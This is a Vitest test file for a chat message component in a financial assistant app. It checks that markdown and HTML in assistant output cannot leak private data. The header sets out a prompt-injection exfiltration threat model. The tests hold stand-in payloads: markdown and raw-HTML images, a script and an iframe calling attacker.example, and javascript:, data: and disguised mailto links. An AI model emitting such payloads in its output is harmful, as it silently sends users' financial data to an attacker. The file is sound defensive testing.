/**
 * ChatMessageBubble — output rendering invariant (SEC-P025)
 *
 * AI-CAPABILITY-PLATFORM-BRD §7.2/§7.3: two legs of the lethal trifecta are
 * structural here. The app holds private financial data, and it is unavoidably
 * exposed to untrusted content (Plaid merchant strings, uploaded flyers). The
 * only leg that can be held closed is the exfiltration vector — what the chat
 * is willing to render.
 *
 * That makes this file load-bearing rather than incidental. Assistant output is
 * rendered as markdown (react-markdown + remark-gfm) behind a narrowed
 * rehype-sanitize allowlist (TD-015). These tests lock that arrangement in place
 * so a future change — widening the allowlist, swapping the renderer, dropping
 * the sanitizer — fails here instead of silently opening a data-exfiltration path.
 *
 * The highest-severity case is the remote image: an <img> fetches on render with
 * no user interaction, so a single injected tag leaks silently. Anchors require a
 * click; images do not.
 */

import { describe, expect, it } from 'vitest';
// Vite's ?raw import gives the component's source as a string without pulling
// node:fs into a browser-targeted tsconfig.
import bubbleSource from './ChatMessageBubble.tsx?raw';
import { render, screen } from '@testing-library/react';
import { MantineProvider } from '@mantine/core';
import type { ChatMessage } from '../../../../shared/types';

import { ChatMessageBubble } from './ChatMessageBubble';

const EXFIL = 'https://attacker.example/collect?d=balance';

function assistantMessage(content: string): ChatMessage {
  return {
    id: 'msg-1',
    role: 'assistant',
    content,
    timestamp: new Date().toISOString(),
  } as ChatMessage;
}

function renderContent(content: string) {
  return render(
    <MantineProvider>
      <ChatMessageBubble message={assistantMessage(content)} />
    </MantineProvider>,
  );
}

describe('ChatMessageBubble — rendering invariant (SEC-P025)', () => {
  describe('remote images are never rendered (SEC-P023)', () => {
    it('strips a markdown image, which would otherwise exfiltrate on render with no click', () => {
      const { container } = renderContent(`Here you go ![chart](${EXFIL})`);

      expect(container.querySelector('img')).toBeNull();
      expect(container.innerHTML).not.toContain('attacker.example');
    });

    // react-markdown does not parse raw HTML unless rehype-raw is added, so the
    // raw-HTML cases below guard against that plugin being introduced rather than
    // against the allowlist. Both failure shapes need covering.
    it('strips a raw HTML <img> tag', () => {
      const { container } = renderContent(`<img src="${EXFIL}" alt="x">`);

      expect(container.querySelector('img')).toBeNull();
    });

    it('strips an <img> smuggled inside an HTML block', () => {
      const { container } = renderContent(
        `<div><p>totals</p><img src="${EXFIL}"></div>`,
      );

      expect(container.querySelector('img')).toBeNull();
    });

    it('does not render a background-image style carrying a remote URL', () => {
      const { container } = renderContent(
        `<div style="background-image:url('${EXFIL}')">totals</div>`,
      );

      expect(container.innerHTML).not.toContain('attacker.example');
    });
  });

  describe('active content is never rendered', () => {
    it('strips <script>', () => {
      const { container } = renderContent(
        '<script>fetch("https://attacker.example")</script>',
      );

      expect(container.querySelector('script')).toBeNull();
    });

    it('strips <iframe>', () => {
      const { container } = renderContent(`<iframe src="${EXFIL}"></iframe>`);

      expect(container.querySelector('iframe')).toBeNull();
    });

    it('strips inline event handlers', () => {
      const { container } = renderContent('<p onmouseover="fetch(1)">hover me</p>');

      expect(container.innerHTML).not.toContain('onmouseover');
    });

    // Verified by mutation: these two pass even if the sanitize allowlist admits
    // javascript:/data:, because react-markdown's own urlTransform strips them
    // first. They guard that second layer — the allowlist itself is guarded by
    // the source-scan test below, which is what actually fails on a widened
    // protocol list.
    it('strips a javascript: href', () => {
      const { container } = renderContent('[click](javascript:alert(1))');

      const hrefs = [...container.querySelectorAll('a')].map(a => a.getAttribute('href'));
      expect(hrefs.some(h => h?.startsWith('javascript:'))).toBe(false);
    });

    it('strips a data: href', () => {
      const { container } = renderContent('[click](data:text/html;base64,PHNjcmlwdD4=)');

      const hrefs = [...container.querySelectorAll('a')].map(a => a.getAttribute('href'));
      expect(hrefs.some(h => h?.startsWith('data:'))).toBe(false);
    });
  });

  describe('the sanitizer stays wired to the renderer', () => {
    // Behavioural tests above catch a widened allowlist. This catches the other
    // failure shape: someone swaps the renderer or drops the sanitize plugin,
    // which would pass every assertion above only until the next dependency bump.
    const source = bubbleSource;

    it('assistant content passes through rehype-sanitize', () => {
      expect(source).toContain('rehypeSanitize');
      expect(source).toMatch(/rehypePlugins=\{\[\[rehypeSanitize/);
    });

    // Verified by mutation: adding 'img' to tagNames fails this test and the
    // markdown-image test above.
    it('the allowlist does not admit img or other embedding tags', () => {
      const tagNames = source.match(/tagNames:\s*\[([\s\S]*?)\]/)?.[1] ?? '';
      expect(tagNames).not.toMatch(/'(img|iframe|object|embed|video|audio|source|link|style|script)'/);
    });

    it('href protocols exclude javascript and data', () => {
      const protocols = source.match(/href:\s*\[([^\]]*)\]/)?.[1] ?? '';
      expect(protocols).not.toMatch(/'(javascript|data)'/);
    });
  });

  describe('legitimate output still renders', () => {
    // An invariant that breaks the feature gets reverted, so guard the
    // capabilities the sanitizer is deliberately keeping.
    it('renders emphasis and inline code', () => {
      renderContent('The **Travel** budget is `5000`.');

      expect(screen.getByText('Travel')).toBeInTheDocument();
      expect(screen.getByText('5000')).toBeInTheDocument();
    });

    it('renders GFM tables, which remark-gfm turns into real <table>', () => {
      const { container } = renderContent(
        ['| Category | Budget |', '| --- | --- |', '| Travel | $5,000 |'].join('\n'),
      );

      expect(container.querySelector('table')).not.toBeNull();
      expect(screen.getByText('$5,000')).toBeInTheDocument();
    });

    it('renders an internal application link, the canonical action-card form', () => {
      const { container } = renderContent('[your task](/tasks?taskId=abc)');

      expect(container.querySelector('a')?.getAttribute('href')).toBe('/tasks?taskId=abc');
    });
  });

  /**
   * SEC-P024, as amended: external links are clickable, but the destination
   * host is always disclosed.
   *
   * The original rule banned external links. That was reversed deliberately —
   * citing a restaurant page is most of the value of trip conversations, and an
   * anchor needs a deliberate click, unlike the remote image that fetches on
   * render. What actually made an anchor dangerous was the MASQUERADE: injected
   * content rendering friendly text over a hostile URL, giving the reader
   * nothing to be suspicious of. These tests lock the disclosure, which is the
   * entire basis on which the amendment was accepted. If they are deleted, the
   * amendment is no longer justified.
   */
  describe('external links disclose their destination (SEC-P024, amended)', () => {
    it('appends the host when the link text does not reveal it', () => {
      const { container } = renderContent(
        '[your OpenTable reservation](https://attacker.example/collect?d=balance)',
      );

      const anchor = container.querySelector('a');
      expect(anchor?.getAttribute('href')).toBe('https://attacker.example/collect?d=balance');
      // The load-bearing assertion: the reader can see where this actually goes.
      expect(container.textContent).toContain('attacker.example');
    });

    it('discloses the host even when the text names a DIFFERENT, trusted-looking site', () => {
      const { container } = renderContent(
        '[opentable.com — confirm your booking](https://attacker.example/x)',
      );

      expect(container.textContent).toContain('attacker.example');
    });

    it('does not stutter when the link text already contains the host', () => {
      const { container } = renderContent('[example.com](https://example.com/menu)');

      expect(container.textContent?.match(/example\.com/g)).toHaveLength(1);
    });

    it('opens external links without handing over the window or a Referer', () => {
      const { container } = renderContent('[menu](https://example.com/menu)');

      const rel = container.querySelector('a')?.getAttribute('rel') ?? '';
      expect(rel).toContain('noopener');
      expect(rel).toContain('noreferrer');
    });

    it('discloses a mailto address the text hides', () => {
      const { container } = renderContent('[email support](mailto:steal@attacker.example)');

      expect(container.textContent).toContain('steal@attacker.example');
    });

    it('does not append a host for an internal link, which has none to disclose', () => {
      const { container } = renderContent('[your task](/tasks?taskId=abc)');

      // Scoped to the anchor's own paragraph — `container` also carries
      // Mantine's injected stylesheet.
      const anchor = container.querySelector('a');
      expect(anchor?.parentElement?.textContent).toBe('your task');
    });

    it('renders a stripped javascript: link as inert text, not a live anchor', () => {
      // urlTransform removes the href; the anchor renderer must not then emit a
      // dead <a> that looks clickable.
      const { container } = renderContent('[click](javascript:alert(1))');

      expect(container.textContent).toContain('click');
      const hrefs = [...container.querySelectorAll('a')].map(a => a.getAttribute('href'));
      expect(hrefs.some(h => h?.startsWith('javascript:'))).toBe(false);
    });
  });

  describe('learning notices are rendered as untrusted text (SEC-L002)', () => {
    // The notice title is model-authored. It must never reach the markdown
    // renderer, or a recorded "gap" becomes a second injection surface — one
    // that persists, since learnings outlive the conversation.
    function renderNotice(title: string) {
      return render(
        <MantineProvider>
          <ChatMessageBubble
            message={{
              ...assistantMessage('I could not reach that.'),
              learningNotice: { capabilityKey: 'tasks.read', title },
            }}
          />
        </MantineProvider>,
      );
    }

    it('shows the notice so an autonomous write is never invisible (REQ-L002)', () => {
      renderNotice('Cannot read the family task list');

      expect(screen.getByText(/Cannot read the family task list/)).toBeInTheDocument();
    });

    it('does not render markdown or HTML inside the notice title', () => {
      const { container } = renderNotice(`**bold** ![x](${EXFIL})`);

      // The URL appearing as literal text is the correct outcome: nothing is
      // fetched and nothing is clickable. What must not exist is an element.
      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('a')).toBeNull();
      expect(container.querySelector('strong')).toBeNull();
      expect(screen.getByText(/\*\*bold\*\*/)).toBeInTheDocument();
    });

    it('renders nothing when no learning was recorded', () => {
      const { container } = renderContent('Just an answer.');

      expect(container.textContent).not.toMatch(/Noted for the developer/);
    });
  });

  describe('user-authored content is never treated as markdown', () => {
    it('renders a user turn as plain text', () => {
      const { container } = render(
        <MantineProvider>
          <ChatMessageBubble
            message={{ ...assistantMessage('<img src="x">**bold**'), role: 'user' }}
          />
        </MantineProvider>,
      );

      expect(container.querySelector('img')).toBeNull();
      expect(container.querySelector('strong')).toBeNull();
      expect(screen.getByText('<img src="x">**bold**')).toBeInTheDocument();
    });
  });
});
